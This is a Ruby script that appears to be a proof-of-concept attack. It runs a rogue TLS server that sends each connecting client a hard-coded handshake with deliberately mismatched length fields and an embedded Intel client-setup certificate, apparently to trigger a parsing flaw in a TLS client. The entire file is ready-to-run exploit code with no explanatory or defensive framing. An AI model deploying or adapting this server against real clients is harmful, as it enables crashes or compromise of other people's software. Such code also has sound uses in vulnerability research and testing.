#!/usr/bin/env ruby

require 'socket'

def gen_ssl_fuzz()
	type="\x16"
	ver="\x03\x01"
	len1="\x00\x4a"
	htype1="\x02"
	len2="\x00\x00\x46"
	ver="\x03\x01"
	rnd="\x46\xb8\xbc\x8c\x2b\xaa\x5f\x16\x2f\xa0\xf2\xa2\x35\xe5\x91\xba\xad\x6b\x06\xdc\x44\x2e\x22\xb9\x02\x92\x53\x26\x3b\xb3\xde\x82"
	len3="\x20"
	senID="\xc9\xd3\xf3\xba\x95\x74\xef\x9c\xbf\x09\xc4\x89\xc1\xfa\xbe\xa9\xe6\x3b\xab\xcd\xb2\x13\xed\x49\xd3\xbc\xe8\x4c\x54\xe5\x47\x5c"
	cipher="\x00\x2f"
	comp="\x00"
	len4="\x03\x04"
	htype2="\x0b"
	len5="\x00\x03\x00"
	len8="\x20\x02\xfd"
	cert="\x00\x02\xfa\x30\x82\x02\xf6\x30\x82\x01\xde\xa0\x03\x02\x01\x02\x02\x04\x10\x54\x94\x62\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00\x30\x32\x31\x0b\x30\x09\x06\x03\x55\x04\x06\x13\x02\x55\x53\x31\x0e\x30\x0c\x06\x03\x55\x04\x0a\x13\x05\x69\x6e\x74\x65\x6c\x31\x13\x30\x11\x06\x03\x55\x04\x03\x13\x0a\x43\x49\x52\x41\x73\x77\x69\x74\x63\x68\x30\x1e\x17\x0d\x30\x37\x30\x37\x32\x35\x30\x31\x34\x38\x34\x31\x5a\x17\x0d\x32\x37\x30\x37\x32\x30\x30\x31\x34\x38\x34\x31\x5a\x30\x78\x31\x0b\x30\x09\x06\x03\x55\x04\x06\x13\x02\x55\x53\x31\x1c\x30\x1a\x06\x03\x55\x04\x0a\x13\x13\x53\x61\x6d\x70\x6c\x65\x20\x4f\x72\x67\x61\x6e\x69\x7a\x61\x74\x69\x6f\x6e\x31\x2a\x30\x28\x06\x03\x55\x04\x0b\x13\x21\x49\x6e\x74\x65\x6c\x28\x52\x29\x20\x43\x6c\x69\x65\x6e\x74\x20\x53\x65\x74\x75\x70\x20\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x31\x1f\x30\x1d\x06\x03\x55\x04\x03\x13\x16\x73\x76\x6c\x78\x35\x33\x39\x2e\x6e\x61\x63\x74\x65\x73\x74\x69\x6e\x67\x2e\x63\x6f\x6d\x30\x81\x9f\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00\x03\x81\x8d\x00\x30\x81\x89\x02\x81\x81\x00\xaa\xc0\x9a\x3f\xda\x32\xa4\xd2\xec\xa4\xa6\x70\xb6\x16\x39\x9d\x80\x92\x56\x49\xa0\x42\x70\x7b\x21\x73\x8b\x22\x60\x75\xf8\x01\x47\xc2\x9d\xb9\xa2\x29\x1e\x55\xab\x2f\x21\x28\x57\xe0\xaa\x64\xda\x6c\xca\x0c\x4e\xac\x77\xfc\x6b\xeb\xcb\x04\x26\x42\x3f\xa1\xb1\x62\xba\x38\xe0\x14\xab\xb4\x3e\x5b\x4e\x41\x1e\x73\xf1\x1a\x4c\xd7\xe4\xbf\x1c\xc7\xa6\x0d\x58\xe0\x95\x75\xeb\xe1\xcf\x67\x7f\xe6\xc0\x56\x70\x7b\x99\xb9\xf2\xa4\xe9\xf4\xe0\xd5\x9a\x04\x9b\x52\xfa\x63\x2b\x4a\x9f\x9a\xfe\xfb\xe1\x2d\x29\x45\x60\xd7\x02\x03\x01\x00\x01\xa3\x52\x30\x50\x30\x41\x06\x03\x55\x1d\x25\x04\x3a\x30\x38\x06\x08\x2b\x06\x01\x05\x05\x07\x03\x01\x06\x08\x2b\x06\x01\x05\x05\x07\x03\x02\x06\x0a\x60\x86\x48\x01\x86\xf8\x4d\x01\x02\x01\x06\x0a\x60\x86\x48\x01\x86\xf8\x4d\x01\x02\x02\x06\x0a\x60\x86\x48\x01\x86\xf8\x4d\x01\x02\x03\x30\x0b\x06\x03\x55\x1d\x0f\x04\x04\x03\x02\x05\xe0\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00\x03\x82\x01\x01\x00\x7d\x6e\xc4\x07\xcd\x92\x62\xa0\xc8\x5a\xaf\x73\xa4\x7b\xde\xef\x57\xe7\x72\x66\x11\x93\x2f\x48\x84\x75\xa6\x90\x67\x80\xfc\xa1\x02\xb3\x72\x39\xf6\x44\xdb\x8b\x36\x8d\x67\xd4\xc6\x17\x21\x98\xbf\x1f\x5f\xfa\x1e\x3d\x07\xaf\xd5\xa6\x30\xb2\x46\x15\xf7\x6c\x37\x44\x32\x30\xde\xe6\xc5\x02\x9c\xc1\x16\xb4\xd9\x1c\x2e\xe3\xc0\xa7\x11\x21\xe9\x48\xba\x9a\xc1\xdf\xa4\x04\xc3\x89\x03\xce\x14\x89\xf9\x35\x91\x60\x7f\xc1\x7a\x55\x53\xc4\xbc\xe9\x87\x22\x64\xee\xa1\xfc\x73\x2d\x17\x88\x6e\x5d\x08\x21\xcd\x0f\x3e\x6e\xf2\x34\xdc\x5e\x60\x53\xc7\x27\x9f\x89\x1b\x84\x68\xc0\x12\xcc\x98\xdb\x28\xc4\x7d\xb4\xcc\xd3\xb0\xa4\x18\xc2\xa5\xac\xf8\x57\x9e\xd9\x70\xc7\xc8\x5f\x31\xd7\x5f\x2d\xb5\x21\xa9\x72\x56\xaa\xfd\x12\xd6\x5a\x26\x66\xa7\x91\x0a\x12\xa5\xe4\x25\x75\xc6\x40\x7c\x15\xc4\xfa\x0a\x9b\x0d\xd0\x37\x21\x3a\xe7\x18\x0d\x2e\x34\x30\xf8\xa4\x22\x1e\x73\x00\xd7\xb9\x95\xcb\x30\x41\x5f\x2d\xe8\x41\xc3\xfd\x92\x6e\x36\x53\x35\x0b\x9c\xd2\xb1\x89\x96\x00\xf7\x1a\x51\x86\xa3\x8e\xbb\x70\x23\xb1\x3d\x4f\xa7\xc9\x74\x91\x03"
	len6="\x00\x04"
	serv_done="\x0e\x00\x00\x00"
	
	return  type + ver + len1 + htype1 + len2 + ver + rnd + len3 + senID + cipher + 
    comp + type + ver + len4 + htype2 + len5 + len8 + cert + type + ver + len6 + serv_done
end
    

if ARGV.length !=2 then
  puts "Usage: ./<filename>.rb <server local IP> <Listen port>"
  puts "Number of args = #{ARGV.length}"
  exit(1)
end

host = ARGV[0]
port = ARGV[1]
puts "Listening on port #{port}"
serv_data=gen_ssl_fuzz()
s = TCPServer.new(host, port)
conn = s.accept()
puts( "Accepted Connection")
while true
  data= conn.recv(1024)
  if (0 == data.length())
    puts "no data received -> exit"
    break
  end
  puts "received #{data.length()} bytes"
  conn.send(serv_data, 0)
end

conn.close()

